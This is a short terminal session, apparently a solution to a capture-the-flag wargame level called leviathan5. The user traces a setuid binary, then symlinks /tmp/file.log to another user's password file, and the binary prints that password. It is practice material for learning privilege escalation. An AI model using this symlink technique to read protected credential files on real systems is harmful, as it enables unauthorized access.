```bash
leviathan5@leviathan:~$ ls
leviathan5
leviathan5@leviathan:~$ ltrace
ltrace: too few arguments
Try `ltrace --help' for more information.
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                             = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                       = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ls /tmp/file.log
/tmp/file.log
leviathan5@leviathan:~$ ls -la /tmp/file.log
lrwxrwxrwx 1 leviathan5 root 30 Apr 26 16:13 /tmp/file.log -> /etc/leviathan_pass/leviathan6
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                             = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                       = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ ls -la /tmp/file.log
lrwxrwxrwx 1 leviathan5 root 30 Apr 26 16:13 /tmp/file.log -> /etc/leviathan_pass/leviathan6
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```
